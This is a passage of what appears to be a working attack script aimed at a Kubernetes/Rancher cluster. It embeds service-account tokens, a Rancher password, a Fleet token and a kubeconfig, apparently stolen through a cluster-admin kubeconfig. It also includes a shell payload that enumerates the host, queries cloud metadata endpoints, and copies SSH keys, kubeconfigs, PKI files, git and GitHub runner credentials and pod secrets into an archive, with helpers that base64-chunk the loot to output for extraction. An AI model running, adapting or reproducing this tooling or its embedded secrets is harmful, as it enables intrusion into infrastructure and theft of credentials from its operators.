vbi1zeXN0ZW06Y2F0dGxlLWltcGVyc29uYXRpb24tdS1tbzc3M3l0dHQ0In0.VfZM13FwmfvUKqtuI8OzSWYN3mK0r74sot4gxkaw9H6ASIn3BlED1i1u2Fogp6jRsFVC22N25kV9-wucEDGgiwGZltSwN4MBInl-v0oeG-Cmnzy6ekbEGTQ2ijkXA0_uJEhp3ge8ygWUqXpWmZ38KROOn6svqWN_p_P3yDruDSMTQoJWI5egAlIKr0Os1lJDwWND_surryqLXeVlYdX4-tyCtyVJQqEbST2whaFENA5VUfSjt5AFRcp-ggFoWWRcsB_FOivxXhqwXQ7TOhXFx776bE69NZiwWH1uvYzCJ1eiM7SotXC7OLU8P0tcK1L0-b99HR1HQ63XtAiVwzfcog", "namespace": "cattle-impersonation-system", "ca.crt": "-----BEGIN CERTIFICATE-----\nMIIDyDCCArCgAwIBAgIUWVIPATjzGFXl9Z4JIgA+C4arfb0wDQYJKoZIhvcNAQEL\nBQAwezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5nWmhvdTESMBAGA1UEBxMJ\nWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRowGAYDVQQLExFLdWJlcm5l\ndGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczAgFw0yNjEwMjgwMjAwMDBa\nGA8yMTI2MTAwNDAyMDAwMFowezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5n\nWmhvdTESMBAGA1UEBxMJWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRow\nGAYDVQQLExFLdWJlcm5ldGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczCC\nASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKMwzOKaqI4czV1bfcj/Becr\nhEd0/L4AYVJX6ZC6t3mCFK7oxlO4/tZeUKdAvvVnTbqapSiOzui0oCieGHxFyXbi\ne2OU9c3SY6cLMN5KPPk3t94iIhVEm1kww3crg/yhdPvZpiR9zZP1ScN9iUyFP7Wu\n+1trm7n0qtZ9gzplHmE7r6wAMTPWn3OLGcrBqtQWpUs8ChK1Hhgetyukyo7xivkF\nYKTcrBgO3Ia/a8LlRI/SMiaBzT9X3ThG7StuURKP10K8Qic9NvZ+kWzt4w/Cb06d\n7TeR5WYJc1IlqOFs3bom3XOOq0pZ6DGSfLzkkySFZSHt/zCRW7tRyp9yu/89a2sC\nAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0O\nBBYEFO/JE0pqppI4fAKeVlcQHOt/5MEiMA0GCSqGSIb3DQEBCwUAA4IBAQBgzkMt\nE8k9clpbipaGm7Fb5GUujMj2js4Wr4+YiaX4Ped28YxXnLKlCGR78kvqXlLcDJRg\n71w/gTaxqkoiuTCyRjTXkC1agoLjWVwUXi4XqVCn5yircxhkF7MCAtMas55lqo1O\nUjxptWS82+V0XwDqFhnGPaEeykhHcypnWXfYWMAWsB1jANKO3k3fiy965d88gTTr\nJjplleZ5tO1i6ZdVDZhfHaKPghpULCMnVuB2omfvg0EnIkQeSg83hdHsAYyunbzw\nzDt7QxyNthFaD6hNriwsodlXfF/1DMxcaZzaWtsjNiG46OuRVWgNYYPDwqtJaa2m\nMbZfh+BcZuB9eyyF\n-----END CERTIFICATE-----\n"}, "cattle-impersonation-system/cattle-impersonation-user-k2tdm-token-l4nsw": {"token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJCRzRfd3RmdnJjMjlGX2w1T0ZTaGlqb1lPbHowNDIxeDhOZFU3cnhQdWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjYXR0bGUtaW1wZXJzb25hdGlvbi1zeXN0ZW0iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2F0dGxlLWltcGVyc29uYXRpb24tdXNlci1rMnRkbS10b2tlbi1sNG5zdyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjYXR0bGUtaW1wZXJzb25hdGlvbi11c2VyLWsydGRtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjFhNGMzNmQtNjlkZS00NWQwLWJlMDgtNzAxOTg1NjQxNzM0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNhdHRsZS1pbXBlcnNvbmF0aW9uLXN5c3RlbTpjYXR0bGUtaW1wZXJzb25hdGlvbi11c2VyLWsydGRtIn0.MlbWLr-tE296fcCH7VnjNPuHvobNjEC7x3Ls44TYf06jJyx_BfmdWTJ00CyyMyK9goCH7-GqF_54kSXBmfZ8SmffAlTj4RsW8Zv-P53vCuvmucvFMoozw7eYNypp96NuHdBFSkcxOek-I4nU0tQlF_PLtm7FHYIbllGQCjL4BgyLsO-ze9V55LpS_Ha15Zu-4-Rgh2WRQx1ka-dD_myADnE253OP9vZnTce4xowow4oM54wE80Q3zfOO7gA6ExeHQwF8W-pA3tYGSnhPoEJX0ygUG55J8OPdudWuLKepmiAWtWA-8FGCuFN11wTGORwBgjq4n7VihmrH7PjRy9ZWlg", "namespace": "cattle-impersonation-system", "ca.crt": "-----BEGIN CERTIFICATE-----\nMIIDyDCCArCgAwIBAgIUWVIPATjzGFXl9Z4JIgA+C4arfb0wDQYJKoZIhvcNAQEL\nBQAwezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5nWmhvdTESMBAGA1UEBxMJ\nWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRowGAYDVQQLExFLdWJlcm5l\ndGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczAgFw0yNjEwMjgwMjAwMDBa\nGA8yMTI2MTAwNDAyMDAwMFowezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5n\nWmhvdTESMBAGA1UEBxMJWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRow\nGAYDVQQLExFLdWJlcm5ldGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczCC\nASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKMwzOKaqI4czV1bfcj/Becr\nhEd0/L4AYVJX6ZC6t3mCFK7oxlO4/tZeUKdAvvVnTbqapSiOzui0oCieGHxFyXbi\ne2OU9c3SY6cLMN5KPPk3t94iIhVEm1kww3crg/yhdPvZpiR9zZP1ScN9iUyFP7Wu\n+1trm7n0qtZ9gzplHmE7r6wAMTPWn3OLGcrBqtQWpUs8ChK1Hhgetyukyo7xivkF\nYKTcrBgO3Ia/a8LlRI/SMiaBzT9X3ThG7StuURKP10K8Qic9NvZ+kWzt4w/Cb06d\n7TeR5WYJc1IlqOFs3bom3XOOq0pZ6DGSfLzkkySFZSHt/zCRW7tRyp9yu/89a2sC\nAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0O\nBBYEFO/JE0pqppI4fAKeVlcQHOt/5MEiMA0GCSqGSIb3DQEBCwUAA4IBAQBgzkMt\nE8k9clpbipaGm7Fb5GUujMj2js4Wr4+YiaX4Ped28YxXnLKlCGR78kvqXlLcDJRg\n71w/gTaxqkoiuTCyRjTXkC1agoLjWVwUXi4XqVCn5yircxhkF7MCAtMas55lqo1O\nUjxptWS82+V0XwDqFhnGPaEeykhHcypnWXfYWMAWsB1jANKO3k3fiy965d88gTTr\nJjplleZ5tO1i6ZdVDZhfHaKPghpULCMnVuB2omfvg0EnIkQeSg83hdHsAYyunbzw\nzDt7QxyNthFaD6hNriwsodlXfF/1DMxcaZzaWtsjNiG46OuRVWgNYYPDwqtJaa2m\nMbZfh+BcZuB9eyyF\n-----END CERTIFICATE-----\n"}, "cattle-system/rancher-token-4mnhh": {"token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJCRzRfd3RmdnJjMjlGX2w1T0ZTaGlqb1lPbHowNDIxeDhOZFU3cnhQdWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjYXR0bGUtc3lzdGVtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InJhbmNoZXItdG9rZW4tNG1uaGgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoicmFuY2hlciIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6ImZkZjM5NDExLTE1YzMtNDEyNS05ZDc4LWQxYWM3MDQ4ZjU4OCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYXR0bGUtc3lzdGVtOnJhbmNoZXIifQ.ON5p0ffeoCFTryAwkTiKnjdS2GafMVWffkdquOE2f2svu5PD-7OrYHsyMBgh3r8EtCE0IS3PuI1CYsQ9342cpwaaNRzF5QYjHv1AonhhqqKDXT2sN7PfBSSKCrNgJA0Em1ooF-ypTb0itZ5w5yI0-RFw7vyqTB147BUm0Hd2PSqnQDVV4E8pr_0wHHlAuLkBqAPfmhogyqK2rLRvNZ2Q27kFVSO2R1LfBRYtokg7Lvi4c2rMrYsdYP_cr6u87SFRuLVWIgWq6WbG7M2l_2FLbIlrg7-8FXGNHtai-R_18ZJCWQb6r4VTC1hmYjjw5R7iHdC1pfirF1zHCcWgjT8awQ", "namespace": "cattle-system", "ca.crt": "-----BEGIN CERTIFICATE-----\nMIIDyDCCArCgAwIBAgIUWVIPATjzGFXl9Z4JIgA+C4arfb0wDQYJKoZIhvcNAQEL\nBQAwezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5nWmhvdTESMBAGA1UEBxMJ\nWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRowGAYDVQQLExFLdWJlcm5l\ndGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczAgFw0yNjEwMjgwMjAwMDBa\nGA8yMTI2MTAwNDAyMDAwMFowezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5n\nWmhvdTESMBAGA1UEBxMJWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRow\nGAYDVQQLExFLdWJlcm5ldGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczCC\nASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKMwzOKaqI4czV1bfcj/Becr\nhEd0/L4AYVJX6ZC6t3mCFK7oxlO4/tZeUKdAvvVnTbqapSiOzui0oCieGHxFyXbi\ne2OU9c3SY6cLMN5KPPk3t94iIhVEm1kww3crg/yhdPvZpiR9zZP1ScN9iUyFP7Wu\n+1trm7n0qtZ9gzplHmE7r6wAMTPWn3OLGcrBqtQWpUs8ChK1Hhgetyukyo7xivkF\nYKTcrBgO3Ia/a8LlRI/SMiaBzT9X3ThG7StuURKP10K8Qic9NvZ+kWzt4w/Cb06d\n7TeR5WYJc1IlqOFs3bom3XOOq0pZ6DGSfLzkkySFZSHt/zCRW7tRyp9yu/89a2sC\nAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0O\nBBYEFO/JE0pqppI4fAKeVlcQHOt/5MEiMA0GCSqGSIb3DQEBCwUAA4IBAQBgzkMt\nE8k9clpbipaGm7Fb5GUujMj2js4Wr4+YiaX4Ped28YxXnLKlCGR78kvqXlLcDJRg\n71w/gTaxqkoiuTCyRjTXkC1agoLjWVwUXi4XqVCn5yircxhkF7MCAtMas55lqo1O\nUjxptWS82+V0XwDqFhnGPaEeykhHcypnWXfYWMAWsB1jANKO3k3fiy965d88gTTr\nJjplleZ5tO1i6ZdVDZhfHaKPghpULCMnVuB2omfvg0EnIkQeSg83hdHsAYyunbzw\nzDt7QxyNthFaD6hNriwsodlXfF/1DMxcaZzaWtsjNiG46OuRVWgNYYPDwqtJaa2m\nMbZfh+BcZuB9eyyF\n-----END CERTIFICATE-----\n"}, "cluster-fleet-local-local-1a3d67d0a899/request-7j2db-a6f262b2-320f-4598-bf94-cdfe5558204c-token": {"token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJCRzRfd3RmdnJjMjlGX2w1T0ZTaGlqb1lPbHowNDIxeDhOZFU3cnhQdWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjbHVzdGVyLWZsZWV0LWxvY2FsLWxvY2FsLTFhM2Q2N2QwYTg5OSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJyZXF1ZXN0LTdqMmRiLWE2ZjI2MmIyLTMyMGYtNDU5OC1iZjk0LWNkZmU1NTU4MjA0Yy10b2tlbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJyZXF1ZXN0LTdqMmRiLWE2ZjI2MmIyLTMyMGYtNDU5OC1iZjk0LWNkZmU1NTU4MjA0YyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6ImE3NjI2NGFjLTcyZWQtNDcxNi05YzkwLTE5N2NjNDY1ZjJmYiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjbHVzdGVyLWZsZWV0LWxvY2FsLWxvY2FsLTFhM2Q2N2QwYTg5OTpyZXF1ZXN0LTdqMmRiLWE2ZjI2MmIyLTMyMGYtNDU5OC1iZjk0LWNkZmU1NTU4MjA0YyJ9.gGQBcHBT1m4UmP30sH-h6xF9uT2yhk2v7277UjvZifWB_F0yl-JccFBb9u5LLq3ZMBiEa6a6wt48lR1Tk9Tq1q0i-bEwirFyK1vcfwTBlA8hY4PejFmJsy33XrdzYV7ptj5rYsg-kG9u6mTNYFmMIXafDoWz0UD5XGneejo54NOrEE0VE1whyD5E5Le6UbLUHRKwLnuaiKUn2BZW65nIwvTgC8DrAx0Qvzkguvu7kB8QQRhInISW6xbOJ2vkvCWIkhihbfUHI7p3jK-lsQBMe2dAH4TIUBrunoNRrZv2LmJLLyauqHSLZVB9tSU9bPF48SR-R6jnT5f993MTl4L27w", "namespace": "cluster-fleet-local-local-1a3d67d0a899", "ca.crt": "-----BEGIN CERTIFICATE-----\nMIIDyDCCArCgAwIBAgIUWVIPATjzGFXl9Z4JIgA+C4arfb0wDQYJKoZIhvcNAQEL\nBQAwezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5nWmhvdTESMBAGA1UEBxMJ\nWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRowGAYDVQQLExFLdWJlcm5l\ndGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczAgFw0yNjEwMjgwMjAwMDBa\nGA8yMTI2MTAwNDAyMDAwMFowezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5n\nWmhvdTESMBAGA1UEBxMJWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRow\nGAYDVQQLExFLdWJlcm5ldGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczCC\nASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKMwzOKaqI4czV1bfcj/Becr\nhEd0/L4AYVJX6ZC6t3mCFK7oxlO4/tZeUKdAvvVnTbqapSiOzui0oCieGHxFyXbi\ne2OU9c3SY6cLMN5KPPk3t94iIhVEm1kww3crg/yhdPvZpiR9zZP1ScN9iUyFP7Wu\n+1trm7n0qtZ9gzplHmE7r6wAMTPWn3OLGcrBqtQWpUs8ChK1Hhgetyukyo7xivkF\nYKTcrBgO3Ia/a8LlRI/SMiaBzT9X3ThG7StuURKP10K8Qic9NvZ+kWzt4w/Cb06d\n7TeR5WYJc1IlqOFs3bom3XOOq0pZ6DGSfLzkkySFZSHt/zCRW7tRyp9yu/89a2sC\nAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0O\nBBYEFO/JE0pqppI4fAKeVlcQHOt/5MEiMA0GCSqGSIb3DQEBCwUAA4IBAQBgzkMt\nE8k9clpbipaGm7Fb5GUujMj2js4Wr4+YiaX4Ped28YxXnLKlCGR78kvqXlLcDJRg\n71w/gTaxqkoiuTCyRjTXkC1agoLjWVwUXi4XqVCn5yircxhkF7MCAtMas55lqo1O\nUjxptWS82+V0XwDqFhnGPaEeykhHcypnWXfYWMAWsB1jANKO3k3fiy965d88gTTr\nJjplleZ5tO1i6ZdVDZhfHaKPghpULCMnVuB2omfvg0EnIkQeSg83hdHsAYyunbzw\nzDt7QxyNthFaD6hNriwsodlXfF/1DMxcaZzaWtsjNiG46OuRVWgNYYPDwqtJaa2m\nMbZfh+BcZuB9eyyF\n-----END CERTIFICATE-----\n"}}, "source": "K8s secrets (service-account-token type) via cluster-admin kubeconfig A-8432", "intent": 9872}
FLEET_TOKEN = "u-mo773yttt4:xzwqb25lh5nbbkvtdmgvczf9xlj6qhdl44v8sv9bsrbcjpmmdgkmr6"
FLEET_KUBECONFIG = {"kubeconfig": "apiVersion: v1\nclusters:\n- cluster:\n    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJ2RENDQVdPZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQkdNUnd3R2dZRFZRUUtFeE5rZVc1aGJXbGoKYkdsemRHVnVaWEl0YjNKbk1TWXdKQVlEVlFRRERCMWtlVzVoYldsamJHbHpkR1Z1WlhJdFkyRkFNVGM1TXpFNQpNekkzTVRBZUZ3MHlOakV3TWpneE16RTBNekZhRncwek5qRXdNalV4TXpFME16RmFNRVl4SERBYUJnTlZCQW9UCkUyUjVibUZ0YVdOc2FYTjBaVzVsY2kxdmNtY3hKakFrQmdOVkJBTU1IV1I1Ym1GdGFXTnNhWE4wWlc1bGNpMWoKWVVBeE56a3pNVGt6TWpjeE1Ga3dFd1lIS29aSXpqMENBUVlJS29aSXpqMERBUWNEUWdBRUt2SWlnS21JQi9LWAp4djZqd3BUei82clNta0htUXhSSzgyYlo3aG94eDd2dUc2bWU3VDAxQVMzRXNHME8xY0VrS1FoYXFlMGhwZDN2ClArK3FBNzBOMXFOQ01FQXdEZ1lEVlIwUEFRSC9CQVFEQWdLa01BOEdBMVVkRXdFQi93UUZNQU1CQWY4d0hRWUQKVlIwT0JCWUVGRnRhbW4yQWEyVlNvbjZWMFZFbnpUTmpuVXQrTUFvR0NDcUdTTTQ5QkFNQ0EwY0FNRVFDSUhiTwoxL2ZRRXdVN2ZPeDRPVW1HY2g4WDFPd1hpMUxmV0NQczlTK1NLMUtqQWlBR3RoWGZTTUg0dTViT0pLU1BvQW51CmQzRlZQTWxoVXdLNU9EaVJvNlZsa0E9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t\n    server: https://10.106.75.65/k8s/clusters/local\n  name: cluster\ncontexts:\n- context:\n    cluster: cluster\n    user: user\n  name: default\ncurrent-context: default\nkind: Config\npreferences: {}\nusers:\n- name: user\n  user:\n    token: u-mo773yttt4:xzwqb25lh5nbbkvtdmgvczf9xlj6qhdl44v8sv9bsrbcjpmmdgkmr6\n", "apiServerURL": "https://10.96.0.1:443"}
RANCHER_PW = "vrj7smfzwm2dlhqfg9hflvwx6w62pr95wlq2jl6j8sfbdpvkp7zcjp"
RANCHER_CA_B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURMVENDQWhXZ0F3SUJBZ0lVY0tBZG5lSGFXNzhzZnNaZnBXQU9NYW5qVTdVd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0pURWpNQ0VHQTFVRUF3d2FZMkV0Y21GdVkyaGxjaTF4ZEdWaGJTNXliMmR2Ymk1amIyMHdJQmNOTWpZeApNREk0TVRNeE1ETTRXaGdQTWpFeU5qRXdNRFF4TXpFd016aGFNQ1V4SXpBaEJnTlZCQU1NR21OaExYSmhibU5vClpYSXRjWFJsWVcwdWNtOW5iMjR1WTI5dE1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0MKQVFFQXNobHhKQnBQM2RVaU8wNUtTQXdWUFExWTlLeGtGbTdzS3Z6THljSGhiaDFWUDBETDNQRGdBblhaM0kyUwpjUDNDOEVBNkhBTEN6L3JBbWdLUWF1QXA2UVBBOC9JY1dWblJJenF5eG15TnlJeUFkVVFIZGZpMzNaY0dSZ2pLClZYSTRtelZwMjdEVDlZVnpvMDlyVXMxOE9kMlVrMWhkVkphY3dpSVBMZTdmTzJpeGZDcXJpbDdrZ0hRTFN0aE4KaGVqaW40NG00amtnUkwyaTB1dFhEbEhBSUZCcU5ZNG9iVVVJYkJZOHZ3YlZJMnVCQTZXMXg1SzNYblRuck5hWAowbG5ZQjhGNnBray9ybVhzaE80bkI1SEpCS0w5TittK1hhT29WT3AxVXZJUis4aG1OMGtzVm5vbTJBOXdHTm9sCmlFWEpvY3MrdGhCYVErelhHZU5PR2dtSW53SURBUUFCbzFNd1VUQWRCZ05WSFE0RUZnUVUyWXhVUGd3aURWOXUKaDRLbkdycHFjMDdCaEhJd0h3WURWUjBqQkJnd0ZvQVUyWXhVUGd3aURWOXVoNEtuR3JwcWMwN0JoSEl3RHdZRApWUjBUQVFIL0JBVXdBd0VCL3pBTkJna3Foa2lHOXcwQkFRc0ZBQU9DQVFFQVJIdjc3YXRxWWRBZUpRaWdnU3lKCnlyR3ZYS0hUdmJ0UHYxaUNBdStmZWpETmsrdmlpSEhJckxBem9uLzZ0Unl4ZFNxWUJIL3AxNXhPZnk3SXl3WmoKSjlQQ25GL3J1TkdaMGtEc0FLRWpub0swVWNsbFAyU2w1ZUxlT1dNTm50TU1Lb2RPWjZEMVkxeEYwdklsSWZyWQp1a01SMkNTb2dhR3ViUGtnSk9SOUNpRW9NdFdXdU5IQUhvcTV5RnJYRGdXVFUxRXhsU2FsdTJkMW9UZ3JKK3NaCkZ6WS8zRlVSK3JPYmdLRFRTYk85bFhRc1BweDVMZ0lyblBiRk9ISDB1MjQwQzB0WE4vemo4TDNXcnpRaGU0Z1AKblNaK2F4UlFiZjBNMWhtRldlU2I4UGR5K1A5NUtBb0dqZ2hFR0VUUHA1NWNQUVRIb0kzSkNjMGQ1OW5CTDlESApndz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"

TOTAL = [0]
LIMIT = 2800000

def say(*a):
    print(*a, flush=True)

def b64chunks(tag, data, cap=None):
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    if cap and len(data) > cap:
        data = data[:cap] + ("\n<<TRUNCATED orig=%d>>" % len(data)).encode()
    b = base64.b64encode(data).decode()
    if TOTAL[0] + len(b) > LIMIT:
        say("I10579SKIP %s size=%d total_cap" % (tag, len(b)))
        return
    TOTAL[0] += len(b)
    for i in range(0, len(b), 600):
        say("I10579B64 %s %d %s" % (tag, i // 600, b[i:i + 600]))
    say("I10579END %s %d %s" % (tag, len(data), hashlib.sha256(data).hexdigest()))

def emit_json(tag, obj, cap=400000):
    b64chunks(tag, json.dumps(obj, ensure_ascii=False, default=str), cap)

def write_file(path, b64, mode=0o600):
    d = base64.b64decode(b64)
    with open(path, "wb") as f:
        f.write(d)
    os.chmod(path, mode)
    return path

def tcp_open(host, port, timeout=5):
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True, round(time.time() - t0, 2), ""
    except Exception as e:
        return False, round(time.time() - t0, 2), "%s: %s" % (type(e).__name__, e)

class Kube:
    def __init__(self, ca, crt=None, key=None, token=None, host=API_HOST, port=API_PORT, insecure=False):
        self.ca, self.crt, self.key, self.token = ca, crt, key, token
        self.host, self.port, self.insecure = host, port, insecure
    def req(self, method, path, body=None, timeout=60, accept="application/json"):
        if self.ca and os.path.exists(self.ca):
            ctx = ssl.create_default_context(cafile=self.ca)
        else:
            ctx = ssl.create_default_context()
        if self.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        if self.crt:
            ctx.load_cert_chain(self.crt, self.key)
        conn = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=timeout)
        hdr = {"Accept": accept, "User-Agent": "i10579-probe"}
        if self.token:
            hdr["Authorization"] = "Bearer " + self.token
        data = None
        if body is not None:
            data = json.dumps(body).encode()
            hdr["Content-Type"] = "application/json"
        conn.request(method, path, body=data, headers=hdr)
        r = conn.getresponse()
        b = r.read()
        hs = {k.lower(): v for k, v in r.getheaders()}
        conn.close()
        return r.status, b, hs

HOST_SCRIPT = r'''set -u
OUT=$(mktemp -d /tmp/i10579.XXXXXX) || exit 9
mkdir -p "$OUT/files"
MAN="$OUT/manifest.txt"
: > "$MAN"
collect() {
  f="$1"
  if [ -f "$f" ] && [ -r "$f" ]; then
    sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
    if [ "$sz" -gt 524288 ]; then echo "SKIP_BIG $f $sz" >> "$MAN"; return; fi
    d="$OUT/files$(dirname "$f")"
    mkdir -p "$d" 2>/dev/null
    if cp -L -p "$f" "$OUT/files$f" 2>/dev/null; then echo "OK $f $sz" >> "$MAN"; else echo "FAIL $f" >> "$MAN"; fi
  fi
}
{
  echo "## hostname"; hostname 2>&1; id 2>&1; uname -a 2>&1; date -u 2>&1
  echo "## os"; cat /etc/os-release 2>/dev/null | head -5
  echo "## ls /root"; ls -la /root 2>&1 | head -40
  echo "## ls /root/.ssh"; ls -la /root/.ssh 2>&1
  echo "## ls etc-k8s"; ls -laR /etc/kubernetes 2>&1 | head -100
  echo "## ls kubelet"; ls -la /var/lib/kubelet 2>&1 | head -50
  echo "## users"; getent passwd 2>/dev/null | head -30
  echo "## routes"; ip route 2>&1; echo ---; cat /etc/hosts 2>/dev/null; echo ---; cat /etc/resolv.conf 2>/dev/null
  echo "## ps"; ps auxf 2>&1 | head -50
  echo "## tools"; for t in crictl ctr docker kubectl hy-smi nvidia-smi jq python3 curl; do printf "%s=" "$t"; command -v "$t" 2>/dev/null || echo MISSING; done
  echo "## crictl ps"; crictl ps 2>&1 | head -60
  echo "## crictl pods"; crictl pods 2>&1 | head -40
  echo "## ctr"; ctr namespace list 2>&1 | head; ctr -n k8s.io containers list 2>&1 | head -30
  echo "## kubelet-svc"; systemctl status kubelet --no-pager 2>&1 | head -20
  echo "## dri"; ls -la /dev/dri /dev/kfd 2>&1
  echo "## hyhal"; ls -la /opt/hyhal/bin 2>&1 | head -20
  echo "## hysmi-L"; timeout 20 /opt/hyhal/bin/hy-smi -L 2>&1 | head -40; timeout 20 hy-smi -L 2>&1 | head -40
  echo "## hysmi"; timeout 30 /opt/hyhal/bin/hy-smi 2>&1 | head -150
  echo "## lspci"; lspci -nn 2>/dev/null | grep -iE 'hygon|hcu|1d94|accel' | head -20
  echo "## imds-aws"; timeout 4 curl -sS -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 1000
  echo; echo "## imds-token"; timeout 4 curl -sS -m 3 -X PUT http://169.254.169.254/latest/api/token 2>&1 | head -c 500
  echo; echo "## imds-gcp"; timeout 4 curl -sS -m 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>&1 | head -c 500
  echo; echo "## imds-huawei"; timeout 4 curl -sS -m 3 http://100.100.100.200/latest/meta-data/ 2>&1 | head -c 800
  echo; echo "## mounts"; mount 2>/dev/null | grep -E 'containerd|kubelet|public|ci_public|overlay' | head -30
} > "$OUT/cmds.txt" 2>&1
for f in /root/.ssh/* /root/.bash_history /root/.zsh_history /root/.kube/config /root/.kube/cache/*/* \
         /etc/kubernetes/*.conf /etc/kubernetes/pki/* /var/lib/kubelet/*.conf /var/lib/kubelet/config.yaml \
         /var/lib/kubelet/kubeconfig /etc/containerd/config.toml /etc/docker/daemon.json \
         /root/.docker/config.json /root/.git-credentials /root/.netrc /root/.config/gh/hosts.yml; do
  [ -e "$f" ] && collect "$f"
done
find /home -maxdepth 4 \( -name '.credentials*' -o -name '.runner' -o -name 'hosts.yml' -o -name 'id_rsa' -o -name 'id_ed25519' -o -name '.git-credentials' -o -name '.netrc' -o -name 'config.json' \) -type f -size -524288 2>/dev/null | head -200 | while read -r f; do collect "$f"; done
for r in /run/containerd/io.containerd.runtime.v2.task/k8s.io/*/rootfs; do
  [ -d "$r" ] || continue
  for rel in home/runner/.credentials home/runner/.runner home/runner/.config/gh/hosts.yml home/runner/.ssh/id_rsa home/runner/.ssh/id_ed25519 root/.credentials root/.ssh/id_rsa home/github/.credentials home/github/.ssh/id_rsa home/github/.config/gh/hosts.yml; do
    [ -e "$r/$rel" ] && collect "$r/$rel"
  done
done
find /var/lib/kubelet/pods -maxdepth 8 \( -path '*kubernetes.io~secret*' -o -path '*kubernetes.io~projected*' \) \( -type f -o -type l \) -size -262144 2>/dev/null | head -300 | while read -r f; do collect "$f"; done
tar czf "$OUT/host.tgz" -C "$OUT" files manifest.txt cmds.txt 2>/dev/null
